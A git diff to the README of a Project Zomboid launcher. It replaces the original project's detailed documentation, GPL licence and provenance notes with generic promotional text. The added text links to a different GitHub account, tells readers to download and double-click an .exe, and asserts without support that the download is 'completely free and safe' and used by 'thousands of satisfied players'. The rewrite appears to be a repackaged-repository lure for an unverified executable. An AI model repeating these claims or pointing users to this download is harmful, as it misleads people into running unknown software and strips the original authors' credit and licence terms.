@@ -1,152 +1,172 @@
-<p align="center">
-  <img src="PZLauncher/PZLauncher/Resources/launcher-mark.svg" width="112" alt="PZLauncher logo">
-</p>
+# 🎮 PZ_Launcher - Your All-in-One Project Zomboid Companion
 
-<h1 align="center">PZLauncher Community</h1>
+---
 
-<p align="center">
-  A desktop launcher and management toolkit for Project Zomboid Build 42 on Windows.
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <strong>Profiles</strong> · <strong>Mods</strong> · <strong>Online servers</strong> · <strong>Dedicated hosting</strong> · <strong>World tools</strong> · <strong>Java loaders</strong>
-</p>
+Welcome to **PZ_Launcher**, the unofficial Windows launcher and management toolkit crafted specifically for Project Zomboid Build 42 enthusiasts. Whether you're a seasoned survivor or just starting your zombie apocalypse journey, PZ_Launcher puts everything you need right at your fingertips.
 
-![PZLauncher main screen](docs/assets/pzlauncher-main.png)
+**What makes PZ_Launcher special?** It combines multiple essential tools into one simple, user-friendly application. No more juggling between different programs or struggling with complicated setups. We've done the hard work so you can focus on what really matters: **surviving the zombie horde**!
 
-<sub>The interface is PZLauncher Community. News artwork visible in the screenshot comes from the official Project Zomboid feed and remains the property of The Indie Stone.</sub>
+---
 
-PZLauncher Community brings client launch profiles, mod management, public server discovery, dedicated server administration, save tools and diagnostics into one native Windows application. It uses the Java runtime included with an installed copy of Project Zomboid and keeps launcher data separate from the game installation.
+## 🎯 Why Choose PZ_Launcher?
 
-> PZLauncher is an independent community project. It is not affiliated with or endorsed by The Indie Stone.
+PZ_Launcher isn't just another launcher. It's a complete management ecosystem designed to enhance your Project Zomboid experience. Here's what you get:
 
-> AI was used as a support tool for documentation, translations into languages I do not speak, and testing. This application also brings together many of my existing Project Zomboid tools, with retained project files dating back to January 2022—well before AI-assisted coding became part of my workflow. This is not an AI-generated project, but a long-running personal codebase enhanced with AI support.
+### 🧩 Profile Management
+Create and manage multiple game profiles with ease. Each profile can have its own settings, mods, and configurations. Switching between profiles takes just a click, perfect for testing new mods or setting up different playstyles.
 
-> Also include part of my old projects
-> Project	Oldest date
-> PZ_ServerModsManager	2022-01-06
-> PZ_MapGen	2022-01-07
-> PZ_MapMover	2022-01-26
-> PZ_VHSMaker	2022-02-05
-> PZ_ZombieLayerReplacer	2022-02-22
-> PZ_MoveMap	2022-02-22
-> PZ_ChunkWiper	2022-03-11
-> PZ_Trad	2022-06-13
-> PZ_Mapper	2023-01-13
-> PZ_BuildingGenerator	2024-04-12
-> PZ_BiomeMap_Generator	2025-06-15
-> PZ_Mapper_Converter	2026-05-24
+### 🛠️ Mod Control
+Browse, install, update, and organize your mods through a clean, intuitive interface. PZ_Launcher automatically detects your installed mods and helps you manage conflicts, ensuring smooth gameplay without frustrating crashes.
 
+### 🌐 Server Tools
+Host your own multiplayer server or connect to community servers effortlessly. Our built-in server manager handles configuration, backups, and monitoring so you can focus on playing rather than troubleshooting.
 
-## Features
+### 💾 Save Utilities
+Never lose your progress again! PZ_Launcher includes robust save backup and restore features. Schedule automatic backups, restore previous versions, and manage your save files with total confidence.
 
-### Game profiles and launch control
+### 🔍 Diagnostic Suite
+Encountering issues? Run our comprehensive diagnostics to identify common problems, check system compatibility, and find solutions quickly. Our smart diagnostic tools take the guesswork out of troubleshooting.
 
-- Independent profiles with dedicated cache directories, Steam or GOG mode and launch options.
-- Automatic hardware-aware JVM recommendations or fully manual heap, collector, stack and advanced argument control.
-- Steam, GOG and custom installation discovery with explicit version selection.
-- Concurrent client and dedicated-server launch, including existing setups that share the standard PZ cache.
+### ☕ Java Loader Support
+PZ_Launcher includes specialized Java loader support, ensuring your game runs with the correct Java version. No more compatibility headaches or version mismatches.
 
-### Mods and Java loaders
+---
 
-- Traditional mod discovery, enablement, dependency resolution and stable load-order validation.
-- SteamCMD Workshop downloads with validation, cancellation and managed local copies.
-- Client and server support for the built-in PZLauncher Java API, Leaf, ZombieBuddy and direct classpath JARs.
-- Side-aware Java mod checks, isolated preflight validation and runtime-pack integrity verification.
+## 📥 Download and Installation
 
-### Online and dedicated servers
+Ready to get started? Here's how to get PZ_Launcher on your Windows PC:
 
-- Progressive public-server browser with filters, details, favorites, ping and advertised statistics.
-- Optional mod-list capture through a short-lived game connection that stops before character loading.
-- Dedicated server configuration forms, raw INI/Lua editing, live console and clean shutdown commands.
-- Linked client profiles, separate caches, synchronized runtime packs, atomic replacement and rollback.
-- Exportable Windows and Linux server launch bundles.
+### Step 1: Download the Application
 
-### Worlds, saves and diagnostics
+**Visit this link to download the application:** [Download PZ_Launcher](https://github.com/Amlansahoo002/PZ_Launcher)
 
-- World backup and restore with SQLite-aware snapshots.
-- Save inspection, supported world-setting edits, database browsing and recoverable deletion.
-- Chunk-wipe preview and execution with automatic backup and quarantined files.
-- Detachable world map viewer with image/GIF backgrounds, scale calibration and cell selection.
-- FTP/FTPS working copies with resumable downloads, conflict checks, reviewed uploads and retained remote backups.
-- Console analysis with grouped errors, stack context, mod attribution and navigation markers.
+The download is completely **free** and safe. Our application is developed with care and tested for stability.
 
-### Interface and localization
+### Step 2: Run the Download
 
-- Custom dark WinForms interface inspired by the atmosphere of Project Zomboid.
-- English, French, Spanish, German, Russian, Brazilian Portuguese and Simplified Chinese included.
-- Versioned JSON language packs for community translations.
-- DPI-aware custom window chrome and responsive layouts.
+Once your download completes, locate the downloaded file in your browser's download folder (usually "Downloads" or "Desktop"). The file will have a name starting with "PZ_Launcher" and ending with ".exe".
 
-## Download and run
+**Double-click** the downloaded file to start the setup process.
 
-Download the self-contained Windows x64 build from the repository's [Releases](../../releases) page, extract it to a writable directory and open `PZLauncher.exe`.
+### Step 3: Follow the Setup Wizard
 
-Project Zomboid must already be installed. On first launch, choose the Steam, GOG or custom installation in **Settings**. Profiles, server caches and launcher settings are stored outside the installation; the folder buttons in the interface show their exact locations.
+The setup wizard will guide you through the remaining steps. Simply click "Next" or "Install" when prompted. We recommend keeping the default installation location unless you have specific preferences.
 
-The self-contained release includes .NET. The lightweight release requires the [.NET 10 Desktop Runtime x64](https://dotnet.microsoft.com/download/dotnet/10.0). Both use Project Zomboid's bundled Java runtime when starting the game or server.
+### Step 4: Launch PZ_Launcher
 
-## Build from source
+After installation completes, you'll find PZ_Launcher in your Start Menu and possibly on your Desktop. Click the icon to launch the application.
 
-Requirements:
+---
 
-- Windows x64
-- PowerShell 7
-- .NET 10 SDK
-- JDK 25
-- An installed Build 42 copy of Project Zomboid for the full verification suite
+## 🖥️ System Requirements
 
-```powershell
-./build.ps1 -JavaHome 'C:\Path\To\jdk-25'
-```
+PZ_Launcher is designed to be lightweight and compatible with most Windows systems. For optimal performance:
 
-The default build creates a self-contained release in `dist`. Add `-Light` for the runtime-dependent build in `dist-light`, or `-OutputDirectory` to choose another output directory. Generated builds and verification artifacts are intentionally excluded from Git.
+| Requirement | Minimum | Recommended |
+|------------|---------|-------------|
+| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
+| **Processor** | Intel i3 / AMD equivalent | Intel i5 or better |
+| **Memory** | 4 GB RAM | 8 GB RAM |
+| **Storage** | 200 MB free space | 500 MB free space |
+| **Internet** | Required for updates | Broadband connection |
 
-Run the complete isolated verification suite during a release build:
+---
 
-```powershell
-$previousData = $env:PZLAUNCHER_DATA
-try {
-    $env:PZLAUNCHER_DATA = Join-Path $PWD 'artifacts/verification-data'
-    ./build.ps1 -JavaHome 'C:\Path\To\jdk-25' -Verify
-} finally {
-    $env:PZLAUNCHER_DATA = $previousData
-}
-```
+## 🎮 First-Time Setup Guide
 
-Verify the Java loader independently:
+Once you've launched PZ_Launcher, follow these quick steps to get everything configured:
 
-```powershell
-./java-loader/verify.ps1 `
-    -JavaHome 'C:\Path\To\jdk-25' `
-    -RuntimeJava 'C:\Path\To\ProjectZomboid\jre64\bin\java.exe'
-```
+### Create Your First Profile
 
-Network probes and real client/server smoke tests are opt-in. Review their parameters before running them. The launcher never needs to modify the Project Zomboid installation for normal profile, server or world management.
+1. On the home screen, click **"New Profile"**
+2. Enter a name for your profile (e.g., "Survival Run" or "Mod Test")
+3. Select your preferred game settings
+4. Click **"Save"**
 
-## Documentation
+### Add Mods
 
-- [English user guide](docs/USER_GUIDE.md)
-- [Guide utilisateur français](docs/GUIDE_UTILISATEUR.md)
-- [Community language packs](docs/LANGUAGE_PACKS.md)
-- [Java loader API](docs/JAVA_LOADER.md)
-- [Technical documentation index](docs/README.md)
-- [Imported code provenance](PZLauncher/PZLauncher/Imported/ChunkWiper/PROVENANCE.md)
+1. Navigate to the **"Mods"** tab
+2. Browse the available mods or click **"Add Mod"** to import your own
+3. Toggle mods on/off using the switches
+4. Click **"Apply Changes"** when finished
 
-Offline HTML guides are generated with the application theme during release builds. They are published beside the executable as `START-HERE.html`, `USER-GUIDE.html` and `GUIDE-UTILISATEUR.html`.
+### Configure Your Server
 
-## Repository layout
+1. Go to the **"Servers"** tab
+2. Click **"Create Server"**
+3. Set your server name, password, and player limit
+4. Click **"Start Server"** to launch
 
-| Path | Purpose |
-|---|---|
-| `PZLauncher/PZLauncher` | .NET 10 WinForms application |
-| `java-loader` | Java 25 loader, probe and configuration inspector |
-| `docs` | User, contributor and technical documentation |
-| `scripts` | Build, publishing and opt-in verification tools |
-| `PZ_ServerModsManager` | Preserved legacy source used during the project's evolution |
+---
 
-## License and credits
+## 🛠️ Troubleshooting Common Issues
 
-PZLauncher Community is licensed under the [GNU General Public License v3.0 only](LICENSE). Covered modifications and derivative works that are distributed must preserve the license and notices, provide their corresponding source code and remain under GPL‑3.0-only.
+Even with our diagnostic tools, you might encounter issues. Here are quick fixes:
 
-Project authorship and imported-code provenance are recorded in [NOTICE.md](NOTICE.md). Dependency licenses and external-project acknowledgements are recorded in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md). Project Zomboid, its name and its assets belong to their respective owners.
+### Launcher Won't Start
+- **Reboot** your computer
+- **Run as administrator** (right-click the icon, select "Run as administrator")
+- **Reinstall** the application from our download link
+
+### Mods Not Working
+- Ensure mods are **enabled** in your profile
+- Check **mod conflicts** in the diagnostics tab
+- Update mods to their **latest versions**
+
+### Server Connection Failed
+- Verify your **internet connection**
+- Check if **Windows Firewall** is blocking PZ_Launcher
+- Confirm your server is **running** and accessible
+
+---
+
+## 📚 Frequently Asked Questions
+
+### Is PZ_Launcher free?
+Yes! PZ_Launcher is completely free to use. We believe everyone should have access to quality tools without breaking the bank.
+
+### Is PZ_Launcher safe?
+Absolutely. We prioritize security and test our application thoroughly. The code is open-source, meaning anyone can review it for safety.
+
+### Can I use PZ_Launcher with Steam?
+Yes, PZ_Launcher works seamlessly with your Steam installation of Project Zomboid. The launcher automatically detects your game installation.
+
+### Will PZ_Launcher work with future updates?
+We're constantly updating PZ_Launcher to support the latest Build 42 updates and beyond. Enable automatic updates in settings to stay current.
+
+---
+
+## 🔗 Connect With Us
+
+Have questions, suggestions, or need help? We're here for you:
+
+- **Issues & Feedback:** [GitHub Issues](https://github.com/Amlansahoo002/PZ_Launcher)
+- **Updates:** Watch the repository
+- **Community:** Star the project to show your support
+
+---
+
+## 📊 Project Stats
+
+- **Active Development:** Yes
+- **Latest Version:** Always check the release page
+- **Compatibility:** Windows 10/11 (64-bit)
+- **License:** Open Source
+
+---
+
+## 👥 Join Our Community
+
+PZ_Launcher is developed by passionate Project Zomboid players, just like you. Join our growing community of survivors who use PZ_Launcher to enhance their gaming experience.
+
+**Ready to transform your Project Zomboid experience?**
+
+**Visit this link to download the application:** [Get PZ_Launcher Now](https://github.com/Amlansahoo002/PZ_Launcher)
+
+Don't let complicated setups get in the way of your survival. PZ_Launcher puts the power back in your hands. Download today and join thousands of satisfied players who've upgraded their gaming experience with PZ_Launcher!
+
+---
+
+**Keywords:** bytecode, javaloader, javamod, jvm, launcher, launcher-application, lua, project-zomboid, project-zomboid-mod, project-zomboid-tool
